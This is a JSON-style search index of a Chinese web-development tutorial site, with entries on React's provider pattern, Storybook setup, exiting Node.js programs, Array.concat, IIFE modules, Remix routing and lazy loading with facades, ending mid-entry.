重置组件中的日期也会重新呈现！\nReset 组件也重新渲染，因为它消费了 useCountContext。 在较小的应用程序中，这不会太重要。 在较大的应用程序中，将频繁更新的值传递给许多组件会对性能产生负面影响。\n为确保组件不使用包含可能更新的不必要值的提供程序，您可以为每个单独的用例创建多个提供程序。\n\r知识点  React.createContext() Provider useContext  ","description":"使数据可用于多个子组件","id":81,"section":"react-patterns","tags":null,"title":"提供者模式","uri":"https://codthing.github.io/react-patterns/design-patterns/provider-pattern/"},{"content":"编写 Story 从项目中选择一个简单的组件，比如一个 Button，然后编写一个 .stories.ts 或一个 .stories.mdx 文件来配合它。\n它可能看起来像这样：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  // YourComponent.stories.ts|tsx  import React from \u0026#39;react\u0026#39;; import { ComponentStory, ComponentMeta } from \u0026#39;@storybook/react\u0026#39;; import { YourComponent } from \u0026#39;./YourComponent\u0026#39;; //👇 此默认导出决定您的故事在故事列表中的位置 export default { title: \u0026#39;YourComponent\u0026#39;, component: YourComponent, } as ComponentMeta\u0026lt;typeof YourComponent\u0026gt;; //👇 args 如何映射到渲染的 template const Template: ComponentStory\u0026lt;typeof YourComponent\u0026gt; = (args) =\u0026gt; \u0026lt;YourComponent {...args} /\u0026gt;; export const FirstStory = Template.bind({}); FirstStory.args = { /*👇 此处的参数取决于组件 */ };   编写文档（可选）\n\u0026lt;!-- YourComponent.stories.mdx --\u0026gt;\rimport { Meta, Story } from \u0026#39;@storybook/addon-docs\u0026#39;;\rimport { YourComponent } from \u0026#39;./YourComponent\u0026#39;;\r\u0026lt;!--👇 标题 prop 决定了故事在故事列表中的位置 --\u0026gt;\r\u0026lt;Meta title=\u0026#34;YourComponent\u0026#34; component={YourComponent} /\u0026gt;\r\u0026lt;!--👇 args 如何映射到渲染的 template --\u0026gt;\rexport const Template = (args) =\u0026gt; \u0026lt;YourComponent {...args} /\u0026gt;;\r\u0026lt;!-- 👇 此处的参数取决于组件 --\u0026gt;\r\u0026lt;Story\rname=\u0026#34;FirstStory\u0026#34;\rargs={{}}\u0026gt;\r{Template.bind({})}\r\u0026lt;/Story\u0026gt; 转到 Storybook 以查看呈现的组件。 如果现在看起来有点不寻常也没关系。\n根据技术堆栈，可能还需要进一步配置 Storybook 环境。\n\r为堆栈配置 Storybook Storybook 带有一个宽松的默认配置。 它尝试自定义自己以适合您的设置。 但这并非万无一失。\n在单独呈现组件之前，项目可能有其他要求。 这需要进一步定制配置。 您可能需要三大类配置。\n1. 像 webpack 和 Babel 一样构建配置 如果在运行 yarn storybook 命令时在 CLI 上看到错误，则可能需要更改 Storybook 的构建配置。 以下是一些可以尝试的事情：\n  Presets 将各种技术的通用配置捆绑到 Storybook 中。 特别是 Create React App、SCSS 和 Ant Design 的预设。\n  为 Storybook 指定自定义 Babel 配置。 如果可以，Storybook 会自动尝试使用您项目的配置。\n  调整 Storybook 使用的 webpack 配置。 如果需要，请尝试在自己的配置中打补丁。\n  2. 运行时配置 如果 Storybook 已构建，但浏览器连接到它时立即看到错误，在这种情况下，很可能输入文件之一未正确编译/转译以供浏览器解释。 Storybook 支持现代浏览器和 IE11，但可能需要检查 Babel 和 webpack 设置（见上文）以确保组件代码正常工作。\n3. Component context 如果某个特定的故事在渲染时出现问题，通常意味着组件希望该组件可以使用特定的环境。\n一个常见的前端模式是让组件假设它们在特定的“上下文”中渲染，父组件在渲染层次结构中更高（例如，主题提供者）。\n使用 Decorators 装饰器 将每个故事“包装”在必要的上下文提供者中。 .storybook/preview.js 文件允许自定义组件在 Canvas（预览 iframe）中的呈现方式。 在下面的示例中，了解如何使用 Styled Components ThemeProvider 主题提供程序组件来包装 Storybook 中呈现的每个组件。\nReact:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  // .storybook/preview.ts  import React from \u0026#39;react\u0026#39;; import { ThemeProvider } from \u0026#39;styled-components\u0026#39;; export const decorators = [ (Story) =\u0026gt; ( \u0026lt;ThemeProvider theme=\u0026#34;default\u0026#34;\u0026gt; \u0026lt;Story /\u0026gt; \u0026lt;/ThemeProvider\u0026gt; ), ];   React(STORY-FUNCTION):\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  // .storybook/preview.ts  import React from \u0026#39;react\u0026#39;; import { ThemeProvider } from \u0026#39;styled-components\u0026#39;; export const decorators = [ (Story) =\u0026gt; ( \u0026lt;ThemeProvider theme=\u0026#34;default\u0026#34;\u0026gt; {Story()} \u0026lt;/ThemeProvider\u0026gt; ), ];   \r渲染组件样式 Storybook 对如何生成或加载 CSS 并不抱有偏见。 它呈现您提供的任何 DOM 元素。 但有时，开箱即用的东西不会“看起来正确”。\n可能需要为 Storybook 的渲染环境配置 CSS 工具。 以下是一些可以提供帮助的提示：\n CSS-in-JS like styled-components and Emotion   如果正在使用 CSS-in-JS，那么样式很可能是有效的，因为它们是在 JavaScript 中生成并与每个组件一起提供的。 主题用户可能需要在 .storybook/preview.js 中添加 decorators（装饰器）\n  @import CSS into components   Storybook 允许直接在组件中导入 CSS 文件。 但在某些情况下，可能需要调整其 webpack 配置。\n  Global imported styles   如果有全局导入的样式，请创建一个名为 .storybook/preview.js 的文件并在那里导入样式。 Storybook 会自动为所有故事添加它们。\n  Add external CSS or webfonts in the \u0026lt;head\u0026gt;   或者，如果想直接将 CSS 链接标记注入 \u0026lt;head\u0026gt;（或其他一些资源，如 webfont 链接），可以使用 .storybook/preview-head.html 添加任意 HTML。\n  从本地目录加载字体或图像   如果从本地目录引用字体或图像，则需要配置 Storybook 脚本以提供静态文件。\n \r加载资产和资源 如果要链接到项目或故事中的静态文件（例如，/fonts/XYZ.woff），请使用 -s path/to/folder 标志指定一个静态文件夹，以便在启动 Storybook 时提供服务。 为此，请编辑 package.json 中的 storybook 和 build-storybook 脚本。\n建议使用 Storybook 静态提供组件中请求的外部资源和资产。 它确保资产始终可用于您的故事。\n","description":"","id":82,"section":"react","tags":null,"title":"设置","uri":"https://codthing.github.io/react/storybook/sb-started/sb-setup/"},{"content":"有多种方法可以终止 Node.js 应用程序。\n1. ctrl + c 在控制台中运行程序时，可以使用 ctrl-C 关闭它，但在这里要讨论的是以编程方式退出。\n2. process.exit() process 核心模块提供了一个方便的方法，允许以编程方式退出 Node.js 程序：process.exit()。\n当 Node.js 运行这一行时，进程会立即被强制终止。\n1 2  process.exit(1)   默认退出代码为 0，表示成功。\n不同的退出代码具有不同的含义，可能希望在自己的系统中使用它来让程序与其他程序通信。\n还可以设置 process.exitCode 属性：\n1 2  process.exitCode = 1   当程序结束时，Node.js 将返回该退出代码。\n当所有处理完成后，程序将优雅地退出。\n很多时候使用 Node.js 启动服务器，比如这个 HTTP 服务器：\n1 2 3 4 5 6 7 8 9  const express = require(\u0026#39;express\u0026#39;) const app = express() app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { res.send(\u0026#39;Hi!\u0026#39;) }) app.listen(3000, () =\u0026gt; console.log(\u0026#39;Server ready\u0026#39;))   这个程序永远不会结束。 如果调用 process.exit()，任何当前挂起或正在运行的请求都将被中止。 这不好。\n3. 进程信号处理程序 在这种情况下，需要向命令发送一个 SIGTERM 信号，并使用进程信号处理程序处理它：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  const express = require(\u0026#39;express\u0026#39;) const app = express() app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { res.send(\u0026#39;Hi!\u0026#39;) }) const server = app.listen(3000, () =\u0026gt; console.log(\u0026#39;Server ready\u0026#39;)) process.on(\u0026#39;SIGTERM\u0026#39;, () =\u0026gt; { server.close(() =\u0026gt; { console.log(\u0026#39;Process terminated\u0026#39;) }) })   SIGKILL 是告诉进程立即终止的信号，理想情况下就像 process.exit() 一样。\nSIGTERM 是告诉进程正常终止的信号。 这是从像 upstart 或 supervisord 等许多其他流程管理人员发送的信号。\n可以从程序内部的另一个函数中发送此信号(或者来自另一个运行 Node.js 的程序，或者在系统中运行的任何其他知道您要终止的进程的 PID 的应用程序)：\n1 2  process.kill(process.pid, \u0026#39;SIGTERM\u0026#39;)   ","description":"","id":83,"section":"nodejs","tags":null,"title":"退出 Node.js 程序","uri":"https://codthing.github.io/nodejs/nodebase/node-exit/"},{"content":"concat() 方法用于合并两个或多个数组。 此方法不会更改现有数组，而是返回一个新数组。\n使用 concat 方法组合两个数组 Concatenation 意思是将元素连接到尾部。\n同理，JavaScript 为字符串和数组提供了concat（Array.prototype.concat()）方法。\n对数组来说，在一个数组上调用 concat 方法，然后提供另一个数组作为参数添加到第一个数组末尾。 它返回一个新数组，不会改变任何一个原始数组。\n简单的例子：\n1  [1, 2, 3].concat([4, 5, 6]); // [1, 2, 3, 4, 5, 6]   复杂的例子：\n1 2 3 4 5 6 7 8 9  function nonMutatingConcat(original, attach) { return original.concat(attach) } const first = [1, 2, 3]; const second = [4, 5]; nonMutatingConcat(first, second); // [1, 2, 3, 4, 5]   \r使用 concat 而不是 push 将元素添加到数组的末尾 函数式编程就是创建和使用具有不变性的函数。\nconcat 方法，是一种在不改变原始数组的前提下，将数组组合成新数组的方法。\n将 concat 方法与 push 方法做比较。\npush 将元素添加到调用它的数组的末尾，这样会改变该数组。\n1 2 3  const arr = [1, 2, 3]; arr.push([4, 5, 6]); console.log(arr); // [1, 2, 3, [4, 5, 6]]   concat 方法可以将新项目添加到数组末尾，而不产生副作用\n1 2 3 4 5 6 7 8 9  function nonMutatingPush(original, newItem) { return original.concat(newItem); } const first = [1, 2, 3]; const second = [4, 5]; nonMutatingPush(first, second); // [1, 2, 3, 4, 5]   ","description":"concat() 方法用于合并两个或多个数组。 此方法不会更改现有数组，而是返回一个新数组。","id":84,"section":"javascript","tags":null,"title":"Array.prototype.concat()","uri":"https://codthing.github.io/javascript/algorithms-data/function-programming/concat-programming/"},{"content":"一、了解立即调用函数表达（IIFE） JavaScript 中的一个常见模式就是，函数在声明后立刻执行：\n1 2 3 4  (function () { console.log(\u0026#34;Chirp, chirp!\u0026#34;); })();   这是一个匿名函数表达式，立即执行并输出 Chirp, chirp!。\n请注意，函数没有名称，也不存储在变量中。\n函数表达式末尾的两个括号（）会让它被立即执行或调用。\n这种模式被叫做立即调用函数表达式（immediately invoked function expression) 或者IIFE。\n\r二、使用 IIFE 创建一个模块 一个立即调用函数表达式（IIFE）通常用于将相关功能分组到单个对象或者是 module 中\n1 2 3 4 5 6 7 8 9 10 11  function glideMixin(obj) { obj.glide = function() { console.log(\u0026#34;Gliding on the water\u0026#34;); }; } function flyMixin(obj) { obj.fly = function() { console.log(\u0026#34;Flying, wooosh!\u0026#34;); }; }   可以将这些 mixins 分成以下模块：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  let motionModule = (function () { return { glideMixin: function(obj) { obj.glide = function() { console.log(\u0026#34;Gliding on the water\u0026#34;); }; }, flyMixin: function(obj) { obj.fly = function() { console.log(\u0026#34;Flying, wooosh!\u0026#34;); }; } } })();   注意： 一个立即调用函数表达式（IIFE）返回了一个 motionModule 对象。\n返回的这个对象包含了作为对象属性的所有 mixin 行为。\nmodule 模式的优点是，所有的运动相关的行为都可以打包成一个对象，然后由代码的其他部分使用。\n下面是一个使用它的例子：\n1 2 3 4 5 6 7 8  let duck = { name: \u0026#34;Donald\u0026#34;, numLegs: 2 }; motionModule.glideMixin(duck); duck.glide(); // Gliding on the water   ","description":"立即调用函数表达式，函数在声明后立刻执行","id":85,"section":"javascript","tags":null,"title":"IIFE","uri":"https://codthing.github.io/javascript/algorithms-data/object-programming/iife/"},{"content":"一、创建 Remix 应用 npx create-remix@latest\ryarn dev 二、创建文件路由  app/root.tsx Layout 组件中\n \u0026lt;li\u0026gt;\r\u0026lt;Link to=\u0026#34;/posts\u0026#34;\u0026gt;Posts\u0026lt;/Link\u0026gt;\r\u0026lt;/li\u0026gt;  创建 app/routes/posts/index.tsx\n export default function Posts() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;Posts\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r} 三、加载数据 Remix 的路由文件相当于后端的模板视图，也是控制器，Remix 建立在 HTTP 和 HTML 的基础之上，因此整个过程无需在浏览器中使用 JavaScript。这也是 Remix 的创新之处，我目前的理解是 Remix 类似 Nodejs中间层 ，只是 Remix 将 React 整合到了中间层中。这样做的好处是少了一层，提升性能的同时简化了开发成本，让前端更专注于前端，后端更专注于后端。\nStep1. 项目根目录下（不是app目录） 创建本地文件模拟数据（真实项目往往是从服务器数据库请求数据）\n posts/my-first-post.md\n ---\rtitle: My First Post\r---\r# This is my first post\rIsn\u0026#39;t it great?  posts/90s-mix-cdr.md\n ---\rtitle: 90s Mixtape\r---\r# 90s Mixtape\r- I wish (Skee-Lo)\r- This Is How We Do It (Montell Jordan)\r- Everlong (Foo Fighters)\r- Ms. Jackson (Outkast)\r- Interstate Love Song (Stone Temple Pilots)\r- Killing Me Softly With His Song (Fugees, Ms. Lauryn Hill)\r- Just a Friend (Biz Markie)\r- The Man Who Sold The World (Nirvana)\r- Semi-Charmed Life (Third Eye Blind)\r- ...Baby One More Time (Britney Spears)\r- Better Man (Pearl Jam)\r- It\u0026#39;s All Coming Back to Me Now (Céline Dion)\r- This Kiss (Faith Hill)\r- Fly Away (Lenny Kravits)\r- Scar Tissue (Red Hot Chili Peppers)\r- Santa Monica (Everclear)\r- C\u0026#39;mon N\u0026#39; Ride it (Quad City DJ\u0026#39;s) Step2. 创建 app/post.ts 这个文件是处理posts的模块，在这里模拟请求数据\n 首先安装两个模块 fron-matter tiny-invariant\n yarn add front-matter //node模块\ryarn add tiny-invariant //类型检查 import path from \u0026#34;path\u0026#34;;\rimport fs from \u0026#34;fs/promises\u0026#34;;\rimport parseFrontMatter from \u0026#34;front-matter\u0026#34;;\rimport invariant from \u0026#34;tiny-invariant\u0026#34;;\rexport type Post = {\rslug: string;\rtitle: string;\r};\rexport type PostMarkdownAttributes = {\rtitle: string;\r};\r// 相对于服务器输出而不是源！\rconst postsPath = path.join(__dirname, \u0026#34;..\u0026#34;, \u0026#34;posts\u0026#34;);\rfunction isValidPostAttributes(\rattributes: any\r): attributes is PostMarkdownAttributes {\rreturn attributes?.title;\r}\rexport async function getPosts() {\rconst dir = await fs.readdir(postsPath);\rreturn Promise.all(\rdir.map(async filename =\u0026gt; {\rconst file = await fs.readFile(\rpath.join(postsPath, filename)\r);\rconst { attributes } = parseFrontMatter(\rfile.toString()\r);\rinvariant(\risValidPostAttributes(attributes),\r`${filename} 有错误的元数据！`\r);\rreturn {\rslug: filename.replace(/\\.md$/, \u0026#34;\u0026#34;),\rtitle: attributes.title\r};\r})\r);\r} Step3. app/routes/posts/index.tsx\nimport { Link, useLoaderData } from \u0026#39;remix\u0026#39;;\rimport { getPosts } from \u0026#39;~/post\u0026#39;;\rimport type { Post } from \u0026#39;~/post\u0026#39;;\rexport const loader = () =\u0026gt; {\rreturn getPosts();\r};\rexport default function Posts() {\rconst posts = useLoaderData\u0026lt;Post[]\u0026gt;();\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;Posts\u0026lt;/h1\u0026gt;\r\u0026lt;ul\u0026gt;\r{posts.map(post =\u0026gt; (\r\u0026lt;li key={post.slug}\u0026gt;\r\u0026lt;Link to={post.slug}\u0026gt;{post.title}\u0026lt;/Link\u0026gt;\r\u0026lt;/li\u0026gt;\r))}\r\u0026lt;/ul\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}; 四、动态路由 Step1. 首先安装 @types/marked 将 markdown 解析为 HTML\nyarn add marked\ryarn add @types/marked Step2. 为 app/post.ts 模块添加一个函数 getPost\nimport path from \u0026#34;path\u0026#34;;\rimport fs from \u0026#34;fs/promises\u0026#34;;\rimport parseFrontMatter from \u0026#34;front-matter\u0026#34;;\rimport invariant from \u0026#34;tiny-invariant\u0026#34;;\rimport { marked } from \u0026#39;marked\u0026#39;;\rexport type Post = {\rslug: string;\rtitle: string;\r};\rexport type PostMarkdownAttributes = {\rtitle: string;\r};\r// 相对于服务器输出而不是源！\rconst postsPath = path.join(__dirname, \u0026#34;..\u0026#34;, \u0026#34;posts\u0026#34;);\rfunction isValidPostAttributes(\rattributes: any\r): attributes is PostMarkdownAttributes {\rreturn attributes?.title;\r};\rexport async function getPosts() {\rconst dir = await fs.readdir(postsPath);\rreturn Promise.all(\rdir.map(async filename =\u0026gt; {\rconst file = await fs.readFile(\rpath.join(postsPath, filename)\r);\rconst { attributes } = parseFrontMatter(\rfile.toString()\r);\rinvariant(\risValidPostAttributes(attributes),\r`${filename} 有错误的元数据！`\r);\rreturn {\rslug: filename.replace(/\\.md$/, \u0026#34;\u0026#34;),\rtitle: attributes.title\r};\r})\r);\r};\rexport async function getPost(slug: string) {\rconst filepath = path.join(postsPath, slug + \u0026#34;.md\u0026#34;);\rconst file = await fs.readFile(filepath);\rconst { attributes, body } = parseFrontMatter(\rfile.toString()\r);\rinvariant(\risValidPostAttributes(attributes),\r`Post ${filepath} is missing attributes`\r);\rconst html = marked(body);\rreturn { slug, html, title: attributes.title };\r} Step3. 创建动态路由文件\n app/routes/posts/$slug.tsx\n import { useLoaderData } from \u0026#39;remix\u0026#39;;\rimport type { LoaderFunction } from \u0026#39;remix\u0026#39;;\rimport { getPost } from \u0026#34;~/post\u0026#34;;\rimport invariant from \u0026#34;tiny-invariant\u0026#34;;\rexport const loader: LoaderFunction = async ({ params }) =\u0026gt; {\rinvariant(params.slug, \u0026#34;expected params.slug\u0026#34;);\rreturn getPost(params.slug);\r};\rexport default function PostSlug() {\rconst post = useLoaderData();\rreturn (\r\u0026lt;div dangerouslySetInnerHTML={{ __html: post.html }} /\u0026gt;\r);\r}; 五、子路由（嵌套路由） Step1. 创建一个 admin 路由文件\n app/routes/admin.tsx 注意使用：Outlet\n import { Outlet, Link, useLoaderData } from \u0026#34;remix\u0026#34;;\rimport { getPosts } from \u0026#34;~/post\u0026#34;;\rimport type { Post } from \u0026#34;~/post\u0026#34;;\rimport adminStyles from \u0026#34;~/styles/admin.css\u0026#34;;\rexport const links = () =\u0026gt; {\rreturn [{ rel: \u0026#34;stylesheet\u0026#34;, href: adminStyles }];\r};\rexport const loader = () =\u0026gt; {\rreturn getPosts();\r};\rexport default function Admin() {\rconst posts = useLoaderData\u0026lt;Post[]\u0026gt;();\rreturn (\r\u0026lt;div className=\u0026#34;admin\u0026#34;\u0026gt;\r\u0026lt;nav\u0026gt;\r\u0026lt;h1\u0026gt;Admin\u0026lt;/h1\u0026gt;\r\u0026lt;ul\u0026gt;\r{posts.map(post =\u0026gt; (\r\u0026lt;li key={post.slug}\u0026gt;\r\u0026lt;Link to={`/posts/${post.slug}`}\u0026gt;\r{post.title}\r\u0026lt;/Link\u0026gt;\r\u0026lt;/li\u0026gt;\r))}\r\u0026lt;/ul\u0026gt;\r\u0026lt;/nav\u0026gt;\r\u0026lt;main\u0026gt;\r\u0026lt;Outlet/\u0026gt;\r\u0026lt;/main\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r};  app/styles/admin.css\n .admin {\rdisplay: flex;\r}\r.admin \u0026gt; nav {\rpadding-right: 2rem;\r}\r.admin \u0026gt; main {\rflex: 1;\rborder-left: solid 1px #ccc;\rpadding-left: 2rem;\r}\rem {\rcolor: red;\r} Step2. 为 admin.tsx 创建子路由文件夹\n app/routes/admin/index.tsx\n import { Link } from \u0026#34;remix\u0026#34;;\rexport default function AdminIndex() {\rreturn (\r\u0026lt;p\u0026gt;\r\u0026lt;Link to=\u0026#34;new\u0026#34;\u0026gt;Create a New Post\u0026lt;/Link\u0026gt;\r\u0026lt;/p\u0026gt;\r);\r} Step3. 在 app/post.ts 处理新建Post的逻辑\nimport path from \u0026#34;path\u0026#34;;\rimport fs from \u0026#34;fs/promises\u0026#34;;\rimport parseFrontMatter from \u0026#34;front-matter\u0026#34;;\rimport invariant from \u0026#34;tiny-invariant\u0026#34;;\rimport { marked } from \u0026#39;marked\u0026#39;;\rexport type Post = {\rslug: string;\rtitle: string;\r};\rexport type PostMarkdownAttributes = {\rtitle: string;\r};\rtype NewPost = {\rtitle: string;\rslug: string;\rmarkdown: string;\r};\r// 相对于服务器输出而不是源！\rconst postsPath = path.join(__dirname, \u0026#34;..\u0026#34;, \u0026#34;posts\u0026#34;);\rfunction isValidPostAttributes(\rattributes: any\r): attributes is PostMarkdownAttributes {\rreturn attributes?.title;\r};\r//Post列表\rexport async function getPosts() {\rconst dir = await fs.readdir(postsPath);\rreturn Promise.all(\rdir.map(async filename =\u0026gt; {\rconst file = await fs.readFile(\rpath.join(postsPath, filename)\r);\rconst { attributes } = parseFrontMatter(\rfile.toString()\r);\rinvariant(\risValidPostAttributes(attributes),\r`${filename} 有错误的元数据！`\r);\rreturn {\rslug: filename.replace(/\\.md$/, \u0026#34;\u0026#34;),\rtitle: attributes.title\r};\r})\r);\r};\r// Post详情\rexport async function getPost(slug: string) {\rconst filepath = path.join(postsPath, slug + \u0026#34;.md\u0026#34;);\rconst file = await fs.readFile(filepath);\rconst { attributes, body } = parseFrontMatter(\rfile.toString()\r);\rinvariant(\risValidPostAttributes(attributes),\r`Post ${filepath} is missing attributes`\r);\rconst html = marked(body);\rreturn { slug, html, title: attributes.title };\r};\r// 新建Post\rexport async function createPost(post: NewPost) {\rconst md = `---\\ntitle: ${post.title}\\n---\\n\\n${post.markdown}`;\rawait fs.writeFile(\rpath.join(postsPath, post.slug + \u0026#34;.md\u0026#34;),\rmd\r);\rreturn getPost(post.slug);\r}; Step4. 创建 app/routes/admin/new.tsx\nimport { useTransition, useActionData, Form, redirect } from \u0026#34;remix\u0026#34;;\rimport type { ActionFunction } from \u0026#34;remix\u0026#34;;\rimport { createPost } from \u0026#34;~/post\u0026#34;;\rimport invariant from \u0026#34;tiny-invariant\u0026#34;;\rtype PostError = {\rtitle?: boolean;\rslug?: boolean;\rmarkdown?: boolean;\r};\rexport const action: ActionFunction = async ({\rrequest\r}) =\u0026gt; {\rawait new Promise(res =\u0026gt; setTimeout(res, 1000));\rconst formData = await request.formData();\rconst title = formData.get(\u0026#34;title\u0026#34;);\rconst slug = formData.get(\u0026#34;slug\u0026#34;);\rconst markdown = formData.get(\u0026#34;markdown\u0026#34;);\rconst errors: PostError = {};\rif (!title) errors.title = true;\rif (!slug) errors.slug = true;\rif (!markdown) errors.markdown = true;\rif (Object.keys(errors).length) {\rreturn errors;\r}\rinvariant(typeof title === \u0026#34;string\u0026#34;);\rinvariant(typeof slug === \u0026#34;string\u0026#34;);\rinvariant(typeof markdown === \u0026#34;string\u0026#34;);\rawait createPost({ title, slug, markdown });\rreturn redirect(\u0026#34;/admin\u0026#34;);\r};\rexport default function NewPost() {\rconst errors = useActionData();\rconst transition = useTransition();\rreturn (\r\u0026lt;Form method=\u0026#34;post\u0026#34;\u0026gt;\r\u0026lt;p\u0026gt;\r\u0026lt;label\u0026gt;\rPost Title:{\u0026#34; \u0026#34;}\r{errors?.title \u0026amp;\u0026amp; \u0026lt;em\u0026gt;Title is required\u0026lt;/em\u0026gt;}\r\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;title\u0026#34; /\u0026gt;\r\u0026lt;/label\u0026gt;\r\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;\r\u0026lt;label\u0026gt;\rPost Slug:{\u0026#34; \u0026#34;}\r{errors?.slug \u0026amp;\u0026amp; \u0026lt;em\u0026gt;Slug is required\u0026lt;/em\u0026gt;}\r\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;slug\u0026#34; /\u0026gt;\r\u0026lt;/label\u0026gt;\r\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;\r\u0026lt;label htmlFor=\u0026#34;markdown\u0026#34;\u0026gt;Markdown:\u0026lt;/label\u0026gt;{\u0026#34; \u0026#34;}\r{errors?.markdown \u0026amp;\u0026amp; \u0026lt;em\u0026gt;Markdown is required\u0026lt;/em\u0026gt;}\r\u0026lt;br /\u0026gt;\r\u0026lt;textarea id=\u0026#34;markdown\u0026#34; rows={20} name=\u0026#34;markdown\u0026#34; /\u0026gt;\r\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;\r\u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;\r{transition.submission\r? \u0026#34;Creating...\u0026#34;\r: \u0026#34;Create Post\u0026#34;}\r\u0026lt;/button\u0026gt;\r\u0026lt;/p\u0026gt;\r\u0026lt;/Form\u0026gt;\r);\r} ","description":"","id":86,"section":"react","tags":null,"title":"Remix 基础","uri":"https://codthing.github.io/react/remix/remix-base/"},{"content":"Spritespin 图片排序 在用数字标志图片名称的时候，图片的旋转顺序应该为逆时针，这样在用鼠标拖拽的时候才能按照鼠标拖拽的方向旋转。 否则，图片旋转方向看起来就是反方向。\nkrpano场景切换 Step1. 将工具切好的内饰位置图片文件夹有序地放入项目panos文件夹中\n 例如： 0.tiles 1.tiles 2.tiles\n Step2. 在tour.xml文件中编辑场景和热点的信息\nStep3. 通过配置tour.xml中的scene和skin/njtvtourskin.xml中的\u0026lt;skin_settings来切换不同的内饰场景和其他可选项 \n 参考\n 注意：tour.xml中的：\n\u0026lt;image\u0026gt;\r\u0026lt;cube url=\u0026#34;panos/1.tiles/%s/l%l/%v/l%l_%s_%v_%h.jpg\u0026#34; multires=\u0026#34;512,1024,2048\u0026#34; /\u0026gt;\r\u0026lt;/image\u0026gt;\r`multires` 中的值必须替换为工具切好的实际数值，这样才能正常显示 ","description":"","id":87,"section":"react-native","tags":null,"title":"Spritespin.js \u0026 krpano ","uri":"https://codthing.github.io/react-native/expo/spritespin-krpano/"},{"content":"  操作系统\n  系统激活\n  Office激活\n  U盘系统安装：\n","description":"","id":88,"section":"others","tags":null,"title":"Win + Office","uri":"https://codthing.github.io/others/windows/win-office/"},{"content":"页面可能包含并非立即需要的组件或资源的代码或数据。\n例如，用户不会看到部分用户界面，除非他们单击或滚动页面的某些部分。\n这适用于编写的多种第一方代码，但这也适用于第三方小部件，\n例如视频播放器或聊天小部件，通常需要单击按钮来显示主界面。\n急切地（即立即）加载这些资源可能会阻塞主线程，如果它们代价高昂，就会推迟用户与页面更关键部分交互的时间。\n这会影响交互准备指标，例如首次输入延迟、总阻塞时间和交互时间。 可以在更合适的时间加载它们，而不是立即加载这些资源，例如：\n  当用户第一次点击与该组件交互时\n  将组件滚动到视图中\n  或推迟加载该组件，直到浏览器空闲（通过 requestIdleCallback）\n  加载资源的不同方法是，在较高级别：\n  Eager - 立即加载资源（加载脚本的正常方式）\n  Lazy（Route-based） - 当用户导航到路由或组件时加载\n  Lazy（交互时） - 当用户点击 UI 时加载（例如显示聊天）\n  Lazy (In viewport) - 当用户向组件滚动时加载\n  预取 - 在需要之前加载，但在加载关键资源之后\n  预加载 - 急切地，具有更高的紧迫性\n  注意：\n只有在交互之前无法预取资源时，才应执行第一部分代码的交互时导入。\n然而，该模式与第三方代码非常相关，如果不重要，通常希望将其推迟到以后的时间点。\n这可以通过多种方式实现（推迟到交互，直到浏览器空闲或使用其他启发式方法）。\n在交互中延迟导入功能代码是本文中介绍的许多上下文中使用的模式。\n之前可能使用过的 Google Docs，它通过将其加载推迟到用户交互，可以为共享功能节省 500KB 的脚本加载。\n另一个适合交互导入的地方是加载第三方小部件。\n\r“Fake” 加载带有外观的第三方 UI 正在导入第三方脚本，并且对其呈现的内容或加载代码的时间的控制较少。\n实现交互加载的一种选择是直截了当的：使用 facade（外观）。\n外观是一个简单的 预览 或 占位符，用于模拟基本体验的成本更高的组件，例如图像或屏幕截图。\n这是在 Lighthouse 团队中一直用于这个想法的术语。\n当用户单击 预览（preview）时，将加载资源的代码。\n这限制了用户在不打算使用某个功能时需要为该功能支付体验费用。\n同样，外观可以在悬停时预连接到必要的资源。\n注意：\n第三方资源经常被添加到页面中，而没有充分考虑它们如何适应网站的整体加载。\n同步加载的第三方脚本会阻止浏览器解析器并延迟水合。\n如果可能，应该使用 async/defer（或其他方法）加载 3P 脚本，以确保 1P 脚本不会缺乏网络带宽。\n除非它们很关键，否则它们可以成为使用交互导入等模式转移到延迟加载的良好候选者。\n\r视频播放器嵌入 “外观”的一个很好的例子是由 Paul Irish 嵌入的 YouTube Lite。\n这提供了一个自定义元素，它采用 YouTube 视频 ID 并呈现最小的缩略图和播放按钮。\n单击该元素会动态加载完整的 YouTube 嵌入代码，这意味着从不单击播放的用户无需支付获取和处理它的费用。\n一些 Google 网站的生产中使用了类似的技术。\n在 Android.com 上，不是急切地加载嵌入的 YouTube 视频播放器，而是向用户显示带有假播放器按钮的缩略图。\n当他们点击它时，会加载一个模式，它使用嵌入的全脂 YouTube 视频播放器自动播放视频：\n\r验证 应用程序可能需要通过客户端 JavaScript SDK 支持服务身份验证。\n这些有时会很大，并且 JS 执行成本很高，如果用户不打算登录，人们可能宁愿不急切地预先加载它们。\n相反，当用户单击“登录”按钮时动态导入身份验证库，从而在初始加载期间保持主线程更空闲。\n\r聊天小工具 通过使用类似的外观方法，Calibre 应用程序将其基于 Intercom 的实时聊天的性能提高了 30%。\n他们仅使用 CSS 和 HTML 就实现了一个“假”快速加载实时聊天按钮，点击后会加载他们的 Intercom 包。\nPostmark 指出，他们的“帮助”聊天小部件总是急切地加载，即使客户只是偶尔使用它。\n该小部件将拉入 314KB 的脚本，超过其整个主页。\n为了改善用户体验，他们使用 HTML 和 CSS 用伪造的副本替换了小部件，在点击时加载真实的东西。\n此更改将交互时间从 7.7 秒减少到 3.7 秒。\n\r其他 当用户点击“滚动到顶部”按钮时，Ne-digital 使用一个 React 库来动画滚动回到页面顶部。\n他们不是急切地为此加载 react-scroll 依赖项，而是在与按钮交互时加载它，节省了大约 7KB：\nhandleScrollToTop() 